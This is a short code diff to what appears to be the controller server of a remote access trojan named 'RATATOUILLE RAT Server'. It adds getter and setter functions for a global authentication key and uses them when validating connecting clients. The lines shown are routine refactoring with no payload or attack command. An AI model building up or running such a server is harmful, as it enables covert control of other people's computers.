@@ -25,6 +25,15 @@ colorama.init(autoreset=True)
 # Global authentication key - will be set by user
 AUTH_KEY = None
 
+def set_auth_key(key):
+    """Set the global authentication key"""
+    global AUTH_KEY
+    AUTH_KEY = key
+
+def get_auth_key():
+    """Get the current authentication key"""
+    return AUTH_KEY
+
 def parse_arguments():
     """Parse command line arguments for server configuration"""
     parser = argparse.ArgumentParser(description='RATATOUILLE RAT Server')
@@ -258,11 +267,12 @@ def accept_connections(server_socket):
                 # Extract and validate authentication key
                 if ":" in validation_response:
                     client_key = validation_response.split(":", 1)[1]
-                    if AUTH_KEY is None:
+                    current_auth_key = get_auth_key()
+                    if current_auth_key is None:
                         print(f"❌ Server authentication key not set! Use 'Set Auth Key' option first.")
                         client.close()
                         continue
-                    elif client_key != AUTH_KEY:
+                    elif client_key != current_auth_key:
                         print(f"❌ Authentication failed from {addr[0]}:{addr[1]} - invalid key: '{client_key}'")
                         client.close()
                         continue
